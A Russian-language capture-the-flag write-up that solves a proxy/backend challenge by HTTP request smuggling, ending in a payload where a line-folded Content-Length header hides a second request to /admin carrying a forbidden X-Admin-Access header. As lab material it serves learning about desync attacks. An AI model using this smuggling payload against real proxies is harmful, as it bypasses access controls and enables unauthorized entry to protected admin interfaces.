## Там сям, туда сюда. Фронтенд в бэкенд и флаг готов. Короче все просто, возьми и забери флаг из /admin 

## Суть задачи

У нас есть два сервера:

- **Прокси** (порт 5000) - принимает запросы от пользователей
- **Бэкенд** (порт 8081) - недоступен напрямую, только через прокси

На бэкенде есть админ панель `/admin`, доступ к которой требует заголовок `X-Admin-Access: true`.

Но прокси **удаляет** этот заголовок из всех запросов и добавляет `X-Forwarded-For`.

## Защита

Если отправить прямой запрос к прокси на `/admin` с заголовком:

```http
GET /admin HTTP/1.1
X-Admin-Access: true
```

  Прокси удалит заголовок → бэкенд не отдаст флаг.  

## **Уязвимость**

Прокси имеет **[0.CL](https://0.cl/) Desync** - он срабатывает когда видит Content-Length:\r\n (с переносом строки и пробелом).
В этом режиме прокси **не изменяет** второй запрос (не удаляет заголовки и не добавляет X-Forwarded-For).

## **Байпас**

Отправляем **один** запрос на порт 5000, внутри которого **два** запроса:

1. **Первый (обычный)** - прокси обрабатывает и удаляет заголовки
2. **Второй (smuggled)** - прокси не видит, передает как есть бэкенду

Бэкенд получает второй запрос на /admin с заголовком X-Admin-Access: true и без X-Forwarded-For → отдает флаг.

## **Финальный Payload**

```javascript
GET / HTTP/1.1
Host: admin.challenge.local:5000
Content-Length:
 67
Connection: keep-alive

GET /admin HTTP/1.1
Host: localhost:8081
X-Admin-Access: true
```
